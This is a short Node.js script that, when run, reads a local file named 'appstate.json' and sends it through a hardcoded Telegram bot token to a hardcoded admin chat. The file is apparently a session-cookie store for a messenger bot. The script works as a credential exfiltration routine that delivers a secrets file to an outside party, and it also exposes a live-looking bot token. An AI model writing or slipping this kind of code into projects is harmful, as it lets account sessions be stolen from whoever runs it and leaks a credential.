const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

const botToken = '7684130645:AAGplava2HKW8VeR-o4MGR-8QBQG74ocMDE'; // Replace with your actual bot token
const bot = new TelegramBot(botToken, { polling: true });

const adminIds = ['1713841196']; 

adminIds.forEach(adminId => {
  bot.sendDocument(adminId, fs.createReadStream('appstate.json'))
    .then(() => {
      console.log(`Document sent to ${adminId}`);
    })
    .catch(err => {
      console.error(`Failed to send document to ${adminId}:`, err);
    });
});
